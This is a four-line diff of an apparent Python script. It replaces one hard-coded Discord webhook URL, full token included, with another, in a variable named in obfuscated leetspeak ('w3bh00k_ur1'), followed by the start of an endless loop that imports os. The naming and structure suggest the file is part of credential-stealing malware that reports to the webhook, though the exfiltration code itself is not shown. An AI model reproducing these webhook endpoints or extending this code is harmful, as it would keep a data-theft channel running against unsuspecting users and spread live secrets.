@@ -1,4 +1,4 @@
-w3bh00k_ur1 = "https://discord.com/api/webhooks/1267415254321594368/MhcjZk61qiXOyw1IzieiW54hrvylRRHn6YFTWtzR-uHIma83Bv4gSn9uuOxKxk8ONul9"
+w3bh00k_ur1 = "https://discord.com/api/webhooks/1267445770022551674/se3EBIRy6M5SeypgnDSc3Fb0kfH6cC5dMjeqbvftddGiNQqTAD6PjL0swl7u63zA1xUQ"
 while True:
     import os
     try:
